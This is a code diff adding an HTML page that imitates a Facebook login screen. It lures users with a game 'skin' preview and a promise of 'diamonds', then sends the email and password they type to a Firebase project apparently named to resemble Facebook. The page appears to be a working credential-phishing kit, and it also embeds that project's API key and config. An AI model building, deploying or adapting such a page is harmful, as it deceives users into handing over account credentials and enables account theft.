@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="shortcut icon" href="diaicon.jpg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login with Facebook</title>
+  <style>
+    body {
+      background: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #1877f2;
+      margin-bottom: 20px;
+      font-size: 26px;
+    }
+
+    .skin-preview {
+      margin-bottom: 15px;
+    }
+
+    .skin-preview img {
+      width: 100px;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.2);
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #166fe5;
+    }
+
+    .login-message {
+      margin-top: 20px;
+      display: none;
+      padding: 15px;
+      background-color: #e6f2ff;
+      border: 1px solid #99ccff;
+      border-radius: 6px;
+      color: #1877f2;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Login with Facebook account</h1>
+
+  <div class="skin-preview">
+    <img id="skinImage" src="" alt="Selected Skin" />
+  </div>
+
+  <div class="login-box">
+    <input type="email" id="username" placeholder="Email" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="handleLogin()">Log In</button>
+    <div id="loginMessage" class="login-message">
+      ✅ Please log back into your mobile to check the diamonds.
+    </div>
+  </div>
+
+  <!-- ✅ Firebase SDK Integration -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-auth.js";
+
+    // ✅ Firebase Config (Replace with your real config if needed)
+    const firebaseConfig = {
+      apiKey: "AIzaSyATt0xBSWunsDdrJiCeSyJEzK6_lxf0iks",
+      authDomain: "uifacebook-37707.firebaseapp.com",
+      projectId: "uifacebook-37707",
+      storageBucket: "uifacebook-37707.appspot.com", // ✅ Corrected here
+      messagingSenderId: "165613562171",
+      appId: "1:165613562171:web:f472f134e583d70e99ef1e"
+    };
+
+    // ✅ Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+
+    // ✅ Skin Image Preview
+    const urlParams = new URLSearchParams(window.location.search);
+    const skinImage = urlParams.get('skin') || 'https://i.imgur.com/ZEpdSai.png';
+    document.getElementById('skinImage').src = skinImage;
+
+    // ✅ Login Handler
+    window.handleLogin = function () {
+      const email = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      signInWithEmailAndPassword(auth, email, password)
+        .then((userCredential) => {
+          console.log("✅ Logged in as:", userCredential.user.email);
+          document.getElementById('loginMessage').style.display = 'block';
+        })
+        .catch((error) => {
+          alert("❌ Login failed: " + error.message);
+        });
+    };
+  </script>
+</body>
+</html>
